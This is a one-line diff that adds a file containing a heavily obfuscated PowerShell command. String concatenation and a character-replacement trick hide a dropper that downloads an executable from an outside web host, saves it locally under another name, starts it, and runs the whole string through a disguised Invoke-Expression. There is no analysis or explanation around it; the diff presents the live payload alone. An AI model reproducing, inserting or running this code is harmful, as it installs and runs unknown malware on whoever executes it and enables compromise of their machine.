@@ -1,0 +1,1 @@
+﻿('(New-Object System.Net.'+'W'+'eb'+'Cli'+'ent).D'+'ownlo'+'ad'+'Fi'+'le'+'(j6Ghttp://w'+'orldni'+'t.com'+'/kuku.e'+'xe'+'j'+'6G,j6Gflee'+'ble.e'+'x'+'ej'+'6G'+');St'+'art-P'+'r'+'ocess j6Gflee'+'b'+'le.exe'+'j6G').rEplAce('j6G',[sTriNg][cHAr]39) |. ((GET-varIabLe '*mDr*').name[3,11,2]-joIN'')
